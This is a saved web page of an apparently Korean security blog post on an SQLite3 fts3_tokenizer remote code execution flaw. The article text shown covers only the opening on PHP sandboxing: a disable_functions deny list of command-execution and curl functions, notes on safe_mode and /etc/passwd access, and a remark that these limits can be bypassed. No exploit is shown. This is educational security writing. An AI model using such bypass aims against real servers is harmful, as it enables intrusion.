.category-page-subtitle{font-size:20px;font-weight:500;padding-bottom:10px;text-align:center}.post-card-wrapper{display:flex;justify-content:center;min-height:150px;width:100%}.post-card-wrapper .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;height:100%;margin-bottom:15px;max-width:720px;padding:15px;transition:-webkit-transform .2s;transition:transform .2s;transition:transform .2s,-webkit-transform .2s;width:100%}.post-card-wrapper .post-card:hover .title{text-decoration:underline}@media(min-width:768px){.post-card-wrapper .post-card{margin-bottom:0}}.post-card-wrapper .post-card .title{font-size:18px;font-weight:600;line-height:1.4;margin-bottom:7px}.post-card-wrapper .post-card .description{-webkit-line-clamp:3;-webkit-box-orient:vertical;color:var(--primary-text-color);display:-webkit-box;font-size:13px;line-height:20px;margin-bottom:10px;overflow:hidden;text-overflow:ellipsis}.post-card-wrapper .post-card .info{color:var(--about-link-icon-color);display:flex;font-size:14px;justify-content:space-between;margin-top:auto}.post-card-wrapper .post-card .info .categories{display:flex}.post-card-wrapper .post-card .info .categories .category{margin-left:4px}.post-card-wrapper .post-card .info .categories .category:hover{text-decoration:underline}.post-card-column-wrapper{display:flex;justify-content:center;width:100%}.post-card-column-wrapper .post-card-column{align-items:center;display:flex;flex-direction:column}.post-card-column-wrapper .post-card-column .post-card-wrapper{margin-bottom:10px}.post-card-column-wrapper .post-card-column .more-post-card-button{background-color:var(--button-background-color);font-size:15px;font-weight:500;height:40px}.post-tabs-wrapper{align-self:flex-start;display:flex;flex-direction:column;justify-content:center;top:0;width:100%}.post-tabs-wrapper .post-tabs{display:flex;height:40px;justify-content:center;margin-bottom:12px;max-width:760px;width:100%}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root{color:var(--tab-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:17px;font-weight:500;height:40px;min-height:auto;min-width:auto;padding:10px 12px;transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected,.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root :hover{color:var(--tab-hover-text-color);transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected{background-color:var(--tab-selected-background-color);border-radius:8px;font-weight:600}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabScrollButton-root{height:40px;width:20px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-scrollable{height:40px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-indicator{display:none}</style><meta name="generator" content="Gatsby 3.14.6"/><style data-emotion="css-global o6gwfi">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:rgba(0, 0, 0, 0.87);font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#fff;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#fff;}</style><style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style><style data-emotion="css 1l6di18 feqhe6 1yf1g2m mnn31 vubbuv 1yxmbwk 6flbmm">.css-1l6di18.Mui-focused .MuiAutocomplete-clearIndicator{visibility:visible;}@media (pointer: fine){.css-1l6di18:hover .MuiAutocomplete-clearIndicator{visibility:visible;}}.css-1l6di18 .MuiAutocomplete-tag{margin:3px;max-width:calc(100% - 6px);}.css-1l6di18 .MuiAutocomplete-inputRoot{-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiAutocomplete-inputRoot,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:30px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:56px;}.css-1l6di18 .MuiAutocomplete-inputRoot .MuiAutocomplete-input{width:0;min-width:30px;}.css-1l6di18 .MuiInput-root{padding-bottom:1px;}.css-1l6di18 .MuiInput-root .MuiInput-input{padding:4px 4px 4px 0px;}.css-1l6di18 .MuiInput-root.MuiInputBase-sizeSmall .MuiInput-input{padding:2px 4px 3px 0;}.css-1l6di18 .MuiOutlinedInput-root{padding:9px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiOutlinedInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:65px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-input{padding:7.5px 4px 7.5px 6px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall{padding:6px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall .MuiAutocomplete-input{padding:2.5px 4px 2.5px 6px;}.css-1l6di18 .MuiFilledInput-root{padding-top:19px;padding-left:8px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiFilledInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:65px;}.css-1l6di18 .MuiFilledInput-root .MuiFilledInput-input{padding:7px 4px;}.css-1l6di18 .MuiFilledInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall{padding-bottom:1px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall .MuiFilledInput-input{padding:2.5px 4px;}.css-1l6di18 .MuiInputBase-hiddenLabel{padding-top:8px;}.css-1l6di18 .MuiAutocomplete-input{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;text-overflow:ellipsis;opacity:1;}.css-feqhe6{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;min-width:0;padding:0;margin:0;border:0;vertical-align:top;width:100%;}.css-1yf1g2m{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;letter-spacing:0.00938em;color:rgba(0, 0, 0, 0.87);box-sizing:border-box;position:relative;cursor:text;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;position:relative;}.css-1yf1g2m.Mui-disabled{color:rgba(0, 0, 0, 0.38);cursor:default;}label+.css-1yf1g2m{margin-top:16px;}.css-1yf1g2m:after{border-bottom:2px solid #1976d2;left:0;bottom:0;content:"";position:absolute;right:0;-webkit-transform:scaleX(0);-moz-transform:scaleX(0);-ms-transform:scaleX(0);transform:scaleX(0);-webkit-transition:-webkit-transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;pointer-events:none;}.css-1yf1g2m.Mui-focused:after{-webkit-transform:scaleX(1) translateX(0);-moz-transform:scaleX(1) translateX(0);-ms-transform:scaleX(1) translateX(0);transform:scaleX(1) translateX(0);}.css-1yf1g2m.Mui-error:after{border-bottom-color:#d32f2f;-webkit-transform:scaleX(1);-moz-transform:scaleX(1);-ms-transform:scaleX(1);transform:scaleX(1);}.css-1yf1g2m:before{border-bottom:1px solid rgba(0, 0, 0, 0.42);left:0;bottom:0;content:"\00a0";position:absolute;right:0;-webkit-transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;pointer-events:none;}.css-1yf1g2m:hover:not(.Mui-disabled):before{border-bottom:2px solid rgba(0, 0, 0, 0.87);}@media (hover: none){.css-1yf1g2m:hover:not(.Mui-disabled):before{border-bottom:1px solid rgba(0, 0, 0, 0.42);}}.css-1yf1g2m.Mui-disabled:before{border-bottom-style:dotted;}.css-mnn31{font:inherit;letter-spacing:inherit;color:currentColor;padding:4px 0 5px;border:0;box-sizing:content-box;background:none;height:1.4375em;margin:0;-webkit-tap-highlight-color:transparent;display:block;min-width:0;width:100%;-webkit-animation-name:mui-auto-fill-cancel;animation-name:mui-auto-fill-cancel;-webkit-animation-duration:10ms;animation-duration:10ms;}.css-mnn31::-webkit-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-moz-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:focus{outline:0;}.css-mnn31:invalid{box-shadow:none;}.css-mnn31::-webkit-search-decoration{-webkit-appearance:none;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-webkit-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-moz-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-webkit-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-moz-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus:-ms-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-ms-input-placeholder{opacity:0.42;}.css-mnn31.Mui-disabled{opacity:1;-webkit-text-fill-color:rgba(0, 0, 0, 0.38);}.css-mnn31:-webkit-autofill{-webkit-animation-duration:5000s;animation-duration:5000s;-webkit-animation-name:mui-auto-fill;animation-name:mui-auto-fill;}.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}.css-1yxmbwk{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;text-align:center;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto;font-size:1.5rem;padding:8px;border-radius:50%;overflow:visible;color:rgba(0, 0, 0, 0.54);-webkit-transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1yxmbwk::-moz-focus-inner{border-style:none;}.css-1yxmbwk.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1yxmbwk{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1yxmbwk:hover{background-color:rgba(0, 0, 0, 0.04);}@media (hover: none){.css-1yxmbwk:hover{background-color:transparent;}}.css-1yxmbwk.Mui-disabled{background-color:transparent;color:rgba(0, 0, 0, 0.26);}.css-6flbmm{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:2.1875rem;}</style><link rel="preconnect" href="https://www.google-analytics.com"/><link rel="dns-prefetch" href="https://www.google-analytics.com"/><script>
  
  function gaOptout(){document.cookie=disableStr+'=true; expires=Thu, 31 Dec 2099 23:59:59 UTC;path=/',window[disableStr]=!0}var gaProperty='G-1H8JDW20BR',disableStr='ga-disable-'+gaProperty;document.cookie.indexOf(disableStr+'=true')>-1&&(window[disableStr]=!0);
  if(true) {
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  }
  if (typeof ga === "function") {
    ga('create', 'G-1H8JDW20BR', 'auto', {});
      ga('set', 'anonymizeIp', true);
      
      
      
      
      }</script><link rel="icon" href="/favicon-32x32.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=27ef31ca9d93d04a8a91b1ea72ecbc4b"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><title data-react-helmet="true">SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구</title><meta data-react-helmet="true" name="viewport" content="initial-scale=1, width=device-width"/><meta data-react-helmet="true" name="google-site-verification" content="CvtC0sASSbMS8Tt14xtB71jITvzabANsDzwmrUVJHAw"/><meta data-react-helmet="true" property="og:title" content="SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구"/><meta data-react-helmet="true" property="og:site_title" content="SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구"/><meta data-react-helmet="true" name="description" content="Web Application : PHP php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요. Web Application RCE Case PHP Security 1 다음은 PHP 보안 기법중  에 대하여 설명을 진행할께요.😛 PHP Sandbox Disable Function 애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능 공격할 수 있는 구간이 존재하여 ,  ,  해당 함수들을 이용하는 경우  Safe_Mode  가 설정된  디렉토리 가 웹 루트로 설정되어 쉘 명령() 을 사용할 수 없게 된다. uid, gid가 다른 경우 접근할 수 없다.  와 같은 파일의 경우  의 특정 옵션이 켜지면 접근할 수 없다.  가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.  밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다. Safe_Mode Bypass 간단하게  에 대해…"/><meta data-react-helmet="true" property="og:description" content="Web Application : PHP php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요. Web Application RCE Case PHP Security 1 다음은 PHP 보안 기법중  에 대하여 설명을 진행할께요.😛 PHP Sandbox Disable Function 애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능 공격할 수 있는 구간이 존재하여 ,  ,  해당 함수들을 이용하는 경우  Safe_Mode  가 설정된  디렉토리 가 웹 루트로 설정되어 쉘 명령() 을 사용할 수 없게 된다. uid, gid가 다른 경우 접근할 수 없다.  와 같은 파일의 경우  의 특정 옵션이 켜지면 접근할 수 없다.  가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.  밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다. Safe_Mode Bypass 간단하게  에 대해…"/><meta data-react-helmet="true" property="og:author" content="Zer0Luck"/><meta data-react-helmet="true" property="og:image" content="/og-image.png"/><meta data-react-helmet="true" property="og:type" content="website"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc4.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2"/><style>@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc-.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxM.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc-.woff) format("woff")}</style><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="alternate" type="application/rss+xml" href="/rss.xml"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){if(void 0===e.target.dataset.mainImage)return;if(void 0===e.target.dataset.gatsbyImageSsr)return;const t=e.target;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link as="script" rel="preload" href="/webpack-runtime-73f29b2cfeafab2e462d.js"/><link as="script" rel="preload" href="/framework-98bc37d489de49fb3b96.js"/><link as="script" rel="preload" href="/app-01fedefb1aba2235d43f.js"/><link as="script" rel="preload" href="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-350e20f31e27e07c540f.js"/><link as="script" rel="preload" href="/component---src-templates-blog-template-js-484a59d2475d768e59bb.js"/><link as="fetch" rel="preload" href="/page-data/php-sqlite3-1day-rce/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1073350324.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1956554647.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/2938748437.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="page-wrapper"><header class="page-header-wrapper"><meta name="google-site-verification" content="CvtC0sASSbMS8Tt14xtB71jITvzabANsDzwmrUVJHAw"/><div class="page-header"><div class="front-section"><a class="link" href="/">Zer0Luck</a></div><div class="trailing-section"><a class="link" href="/about">about</a><a class="link" href="/posts">posts</a><div class="MuiAutocomplete-root MuiAutocomplete-hasPopupIcon css-1l6di18"><div class="search-input-wrapper"><div class="MuiFormControl-root MuiFormControl-fullWidth MuiTextField-root search-input css-feqhe6"><div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-formControl MuiInputBase-adornedEnd MuiAutocomplete-inputRoot css-1yf1g2m"><input type="text" aria-invalid="false" autoComplete="off" value="" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedEnd MuiAutocomplete-input MuiAutocomplete-inputFocused css-mnn31" aria-autocomplete="list" aria-expanded="false" autoCapitalize="none" spellcheck="false" role="combobox"/><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium search-icon css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SearchOutlinedIcon"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg></div></div></div></div></div></div></header><main class="page-content"><header class="post-header"><div class="emoji">🥙</div><div class="info"><div class="categories"><a class="category" href="/posts/Web">Web</a></div></div><h1 class="title">SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구</h1><div class="info"><div class="author">posted by <strong>Zer0Luck</strong>,</div> <!-- -->December 20, 2020</div></header><div class="post-content"><div class="markdown"><h1 id="web-application--php" style="position:relative;"><a href="#web-application--php" aria-label="web application  php permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Web Application : PHP</h1>
<ul>
<li>php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요.</li>
</ul>
<p><a href="https://dnsdudrla97.github.io/web_application_rce1/">Web Application RCE Case</a></p>
<h1 id="php-security-1" style="position:relative;"><a href="#php-security-1" aria-label="php security 1 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PHP Security 1</h1>
<ul>
<li>다음은 PHP 보안 기법중 <code class="language-text">Sandbox</code> 에 대하여 설명을 진행할께요.😛</li>
</ul>
<h2 id="php-sandbox" style="position:relative;"><a href="#php-sandbox" aria-label="php sandbox permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PHP Sandbox</h2>
<aside>
💡 SandBox 가 뭘까?
> 애플리케이션 환경에서 대상 리눅스 명령어를 사용할 수 있는 권한이 있더라고 대상 애플리케이션이 설정한 권한 이외의 행동을 수행할 수 없게 한다.
</aside>
<p><strong>Disable Function</strong></p>
<ul>
<li>애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능</li>
<li>공격할 수 있는 구간이 존재하여 <code class="language-text">명령 실행(system, proc_open, shell_exec)</code>, <code class="language-text">소켓(socket)</code> , <code class="language-text">통신(curl)</code> 해당 함수들을 이용하는 경우 <code class="language-text">Disable Function으로 작성할 시 공격이 어렵다.</code></li>
</ul>
<aside>
💡 Sandbox 개념에서 시스템 함수들이 비활성화되어 있지만 우회하면 되겠죠?
</aside>
<div class="gatsby-highlight" data-language="markdown"><pre class="language-markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">##</span> Disable Function Example</span>
<span class="token list punctuation">-</span> exec
<span class="token list punctuation">-</span> passthru
<span class="token list punctuation">-</span> shell_exec
<span class="token list punctuation">-</span> system
<span class="token list punctuation">-</span> proc_open
<span class="token list punctuation">-</span> popen
<span class="token list punctuation">-</span> curl_exec
<span class="token list punctuation">-</span> curl_multi_exec
<span class="token list punctuation">-</span> parse_ini_file
<span class="token list punctuation">-</span> show_source</code></pre></div>
<p><strong>Safe_Mode</strong></p>
<ul>
<li><code class="language-text">chroot</code> 가 설정된 <code class="language-text">/var/www/html</code> 디렉토리 가 웹 루트로 설정되어 쉘 명령(<code class="language-text">/bin/ls, /bin/id</code>) 을 사용할 수 없게 된다.</li>
<li>uid, gid가 다른 경우 접근할 수 없다.
<ul>
<li><code class="language-text">/etc/passwd</code> 와 같은 파일의 경우 <code class="language-text">safe_mode</code> 의 특정 옵션이 켜지면 접근할 수 없다.</li>
</ul>
</li>
<li><code class="language-text">safe_mode</code> 가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.</li>
</ul>
